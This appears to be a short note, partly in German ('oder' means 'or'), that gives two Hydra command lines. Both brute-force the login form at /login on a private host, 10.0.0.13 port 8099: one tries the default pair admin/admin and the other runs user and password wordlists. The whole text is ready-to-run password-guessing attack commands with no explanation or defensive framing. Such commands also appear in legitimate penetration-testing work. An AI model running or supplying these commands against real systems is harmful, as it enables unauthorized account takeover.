hydra -l admin -p admin -s 8099 10.0.0.13 http-post-form "/login:username=^USER^&password=^PASS^:Please log in"

oder:
hydra -L user.list -P pass.list -s 8099 10.0.0.13 http-post-form "/login:username=^USER^&password=^PASS^:Please log in"